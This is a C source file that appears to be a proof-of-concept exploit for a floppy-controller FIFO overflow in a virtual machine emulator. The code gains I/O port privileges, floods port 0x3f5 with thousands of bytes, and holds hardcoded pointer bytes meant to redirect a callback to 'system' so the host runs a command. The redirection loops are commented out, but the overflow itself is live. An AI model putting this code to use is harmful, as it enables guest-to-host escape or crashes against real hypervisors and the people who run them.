#include<stdio.h>
#include<sys/io.h>
#define FIFO 0x3f5
#define RDID 0x0a
#define SPC_COMMAND 0x8e
#define BH_COUNT 0x4b00
#define SH_POSITION 0x1ff
#define SH_COUNT 7
#define TEST_VAL  0x11
#define FD_CMD_READ 0x06
#define WRITE 0x05
#define NUM_STRUCT 0x00
#define STRUCT_LEN 0x28
int main(void){
        unsigned char code[] = {'m','k','t','e','m','p','\0'};  //this can be a input of the function
        int len_of_command = sizeof(code)/(sizeof(char));
        // printf("len = %d\n", len_of_command);
    
         //rewrite bh structure to point to "system", where cb is system, opaque is the string address
        char ctx[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
        char cb[8] =    {0x30,0xf2,0x6b,0xf6,0xff,0x7f,0x00,0x00};
        char opaque[8]= {0x00,0x26,0x20,0x56,0x55,0x55,0x00,0x00};
        char next[8]=   {0xc0,0x45,0x1d,0x56,0x55,0x55,0x00,0x00};
        char sid[8]= {0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
        //open up port and set permission
        iopl(3);
        ioperm(FIFO, 1, 1);
        outb(SPC_COMMAND, FIFO);
        // int i,j;
        // j = BH_COUNT-SH_POSITION-len_of_command-NUM_STRUCT*STRUCT_LEN;
        // //find a position to write shell code
        // for(i=0; i<SH_POSITION; i++ ){
        //     outb(TEST_VAL,0x3f5);
        // }
        // //write shell code
        // for(i=0;i<SH_COUNT; i++){
        //     outb(code[i], FIFO);
        // }
        // go to bh struct
        int i;
        for(i=0; i<BH_COUNT; i++){
            outb(TEST_VAL, FIFO);
        }
        
        //start to rewrite
        //  for(i=0; i< 8; i++){
        //     outb(ctx[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(cb[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(opaque[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(next[i], FIFO);
        // }
        // for(i=0; i< 3; i++){
        //     outb(sid[i], FIFO);
        // }
}
